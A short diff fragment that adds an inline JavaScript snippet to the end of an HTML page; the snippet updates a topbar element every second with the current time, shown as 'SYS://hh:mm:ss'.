+
+  <!-- Live clock in topbar -->
+  <script>
+    (function () {
+      const el = document.getElementById('cp-clock');
+      if (!el) return;
+      function tick() {
+        const now = new Date();
+        const hh  = String(now.getHours()).padStart(2,'0');
+        const mm  = String(now.getMinutes()).padStart(2,'0');
+        const ss  = String(now.getSeconds()).padStart(2,'0');
+        el.textContent = `SYS://${hh}:${mm}:${ss}`;
+      }
+      tick();
+      setInterval(tick, 1000);
+    })();
+  </script>
+
+</body>
+</html>
